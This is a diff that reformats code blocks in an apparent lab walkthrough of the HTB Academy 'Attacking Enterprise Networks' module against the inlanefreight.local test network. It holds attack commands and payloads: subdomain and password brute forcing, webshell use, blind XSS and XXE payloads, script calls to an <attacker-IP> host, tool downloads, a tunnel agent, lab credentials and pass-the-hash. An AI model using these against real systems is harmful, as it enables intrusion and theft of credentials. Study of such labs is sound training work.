@@ -176,9 +176,9 @@ Answer: monitoring
 Method: we will run the command
 ```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ
-```
 -u http://inlanefreight.local/ -H
 'Host:FUZZ.inlanefreight.local' -fs 15157
+```
 to use 'ffuf' tool to brute force subdomains, using the wordlist namelist.txt
 which is built in, in the box in the path
 '/usr/share/seclists/Discovery/DNS/namelist.txt':
@@ -198,7 +198,7 @@ which is built in, in the box in the path
 #### Technical Methodology & Exploit Execution:
 
 we will check the ftp service, we will run the command:
-ftp <target-IP>
+`ftp <target-IP>`
 and on the credentials we will enter 'anonymous' for username and blank
 password:
 
@@ -301,9 +301,9 @@ Content/common.txt' built in in the pwnbox.
 We will use the command:
 ```bash
 gobuster dir -u http://dev.inlanefreight.local -w
-```
 /usr/share/seclists/Discovery/Web-Content/common.txt -x .php
 -t 300
+```
 where dev.inlanefreight.local is our vhost of course:
 
 *
@@ -470,7 +470,7 @@ Here is the upload request:
 #### Technical Methodology & Exploit Execution:
 
 curl
-http://dev.inlanefreight.local/uploads/webshell.php?cmd=id
+`http://dev.inlanefreight.local/uploads/webshell.php?cmd=id`
 
 ![Figure 16.1 — Lab execution and output verification (Page 16)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p016_01.png)
 *_Figure 16.1 — Lab execution and output verification (Page 16)_*
@@ -489,16 +489,16 @@ http://dev.inlanefreight.local/uploads/webshell.php?cmd=id
 ### Ok, the flag will be in '../flag.txt', lets confirm
 
 Ok, the flag will be in '../flag.txt', lets confirm:
-curl
-http://dev.inlanefreight.local/uploads/webshell.php?cmd=ls%2
-0..
+```bash
+curl http://dev.inlanefreight.local/uploads/webshell.php?cmd=ls%20..
+```
 the '%20'  is the URL encoding for space, so we effectively run the command 'ls
 ..' – check the content of the parent directory.
 
 Here is the flag, lets get it:
-curl
-http://dev.inlanefreight.local/uploads/webshell.php?cmd=cat%
-20../flag.txt
+```bash
+curl http://dev.inlanefreight.local/uploads/webshell.php?cmd=cat%20../flag.txt
+```
 
 ![Figure 17.1 — Lab execution and output verification (Page 17)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p017_01.jpg)
 *_Figure 17.1 — Lab execution and output verification (Page 17)_*
@@ -542,8 +542,8 @@ Next – lets download this password list for brute force (we call it
 passwords.txt), and we run the command:
 ```bash
 sudo wpscan --url http://ir.inlanefreight.local -P
-```
 passwords.txt -U ilfreightwp
+```
 
 ![Figure 18.1 — Lab execution and output verification (Page 18)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p018_01.jpg)
 *_Figure 18.1 — Lab execution and output verification (Page 18)_*
@@ -659,12 +659,12 @@ sqlmap -r sqli.txt --dbms=mysql -D status -T users --dump
 First, we will need do initial configuration on vhost
 'support.inlanefreight.local' and the target IP .
 Lets enter the website:
-http://support.inlanefreight.local/
+`http://support.inlanefreight.local/`
 
 
 And we select 'Raise Ticket':
 It gets us to
-http://support.inlanefreight.local/ticket.php
+`http://support.inlanefreight.local/ticket.php`
 
 ![Figure 23.1 — Lab execution and output verification (Page 23)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p023_01.jpg)
 *_Figure 23.1 — Lab execution and output verification (Page 23)_*
@@ -677,7 +677,9 @@ http://support.inlanefreight.local/ticket.php
 ### Before we hit 'send', first lets initiate netcat listener
 
 The first 4 fields values are irrelevant, but on the Message field we put:
-'"><script src=http://<attacker-IP>:4444/TESTING_THIS</script>Message'
+```html
+'"><script src="http://<attacker-IP>:4444/TESTING_THIS"></script>Message
+```
 It will launch an attack called 'blind cross scripting' and deliver to a listener the
 value 'TESTING_THIS'.
 Before we hit 'send', first lets initiate netcat listener:
@@ -735,8 +737,10 @@ sudo php -S 0.0.0.0:4444
 listener is running..
 
 
-And we submit another ticker, where in the 'Message' field the content is:
-'"><script src=http://<attacket-IP>:4444/script.js></script>'
+And we submit another ticket, where in the 'Message' field the content is:
+```html
+'"><script src="http://<attacker-IP>:4444/script.js"></script>'
+```
 
 And SEND..
 
@@ -832,6 +836,7 @@ It works, now it is displayed as title.
 
 Lets try to perform SSRF – Server Side Request Forgery attack, based on this
 guide – we will get the flag by entering this script:
+```html
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
@@ -839,6 +844,7 @@ document.write(this.responseText)};
 x.open("GET","file:///flag.txt");
 x.send();
 </script>
+```
 
 ![Figure 30.1 — Lab execution and output verification (Page 30)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p030_01.jpg)
 *_Figure 30.1 — Lab execution and output verification (Page 30)_*
@@ -896,7 +902,7 @@ burpsuite
 set the interceptor off.
 ```
 Then lets enter in the browser to
-http://shopdev2.inlanefreight.local
+`http://shopdev2.inlanefreight.local`
 
 
 And we are at the login page. Trying the default credentials 'admin:admin'
@@ -951,6 +957,8 @@ And open the request on the repeater:
 
 
 We will replace the existing xml in the request with this xml script:
+
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE userid [
 <!ENTITY xxetest SYSTEM "file:///flag.txt">
@@ -963,6 +971,7 @@ undefined
 &xxetest;
 </userid>
 </root>
+```
 
 ![Figure 35.1 — Lab execution and output verification (Page 35)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p035_01.jpg)
 *_Figure 35.1 — Lab execution and output verification (Page 35)_*
@@ -1513,7 +1522,7 @@ Then, we run the proxy:
 
 
 Now we are ready to run the agent in dmz01:
-./agent -connect <attacker-IP>:11601 -ignore-cert
+./agent -connect `<attacker-IP>`:11601 -ignore-cert
 
 
 
@@ -1775,7 +1784,7 @@ So let's save the settings:
 ### When that's done, we will go to
 
 When that's done, we will go to:
-http://172.16.8.20/admin/file-management
+`http://172.16.8.20/admin/file-management`
 and select 'Upload Files':
 
 The file we will upload is this asp webshell.
@@ -1938,8 +1947,8 @@ cd C:\Windows\Temp
 
 ```bash
 iwr -uri http://172.16.8.120:20000/PrintSpoofer64.exe -
-```
 outfile PrintSpoofer64.exe
+```
 
 ```bash
 iwr -uri http://172.16.8.120:20000/nc64.exe -outfile
@@ -1980,7 +1989,7 @@ cd C:\DotNetNuke\Portals\0
 
 
 This path serves as
-http://172.16.8.20/admin/file-management
+`http://172.16.8.20/admin/file-management`
 root directory:
 
 ![Figure 71.1 — Lab execution and output verification (Page 71)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p071_01.jpg)
@@ -2098,12 +2107,12 @@ Now, we will start Active Directory enumeration.
 In the website, we will add the extension of 'ps.1' to the list of allowed
 extensions (the method for doing that was thoroughly covered in the previous
 question)
-http://172.16.8.20
+`http://172.16.8.20`
 
 and when 'ps1' Files are upload eligible, we will download to the pwnbox
 PowerView.ps1
 We will use the
-http://172.16.8.20/admin/file-management
+`http://172.16.8.20/admin/file-management`
 interface to upload the PowerView to 'C:\DotNetNuke\Portals\0' in DEV01.
 (again, the method for doing that was thoroughly covered in the previous
 question).
@@ -2144,9 +2153,8 @@ We can observe that all Domain Users ('hporter' included), can RDP to DEV01.
 
 Well, Lets RDP:
 ```bash
-xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /dynamic-
+xfreerdp /v:172.16.8.20 /u:hporter /p:Gr8hambino! /dynamic-resolution
 ```
-resolution
 
 
 When RDP , we get this terminal
@@ -2194,8 +2202,8 @@ mkdir imported_data
 
 ```bash
 sudo mount -t cifs //172.16.8.3/"Department Shares"
-```
 imported_data -o username=ssmalls,password=jonsnow
+```
 
 
 Giving a view on the 'imported_data directory':
@@ -2265,7 +2273,7 @@ Lets add 'csv' to the allowed format:
 
 *reminder: settings  →  Security  →  More  →  More Security Settings. *
 And refresh
-http://172.16.8.20/admin/file-management
+`http://172.16.8.20/admin/file-management`
 
 
 Here is the output csv file, lets download it to the pwnbox.
@@ -2379,8 +2387,8 @@ It has RDP access to the machine.
 Very well then:
 ```bash
 xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin
-```
 /dynamic-resolution
+```
 
 ![Figure 83.1 — Lab execution and output verification (Page 83)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p083_01.jpg)
 *_Figure 83.1 — Lab execution and output verification (Page 83)_*
@@ -2726,8 +2734,8 @@ access that on the Administrator user, using the hash. We will use the
 command:
 ```bash
 evil-winrm -i 172.16.8.3 -u Administrator -H
-```
 fd1f7e5564060258ea787ddbb6e6afa2
+```
 
 ![Figure 96.1 — Lab execution and output verification (Page 96)](/assets/images/posts/htb-academy/attacking-enterprise-networks/p096_01.jpg)
 *_Figure 96.1 — Lab execution and output verification (Page 96)_*
@@ -2882,8 +2890,8 @@ root@monitoring.inlanefreight.local:/root
 
 ```bash
 iwr -uri http://172.16.8.120:20000/windows_agent.zip -
-```
 outfile windows_agent.zip
+```
 
 
 We have the zip file in DC01:
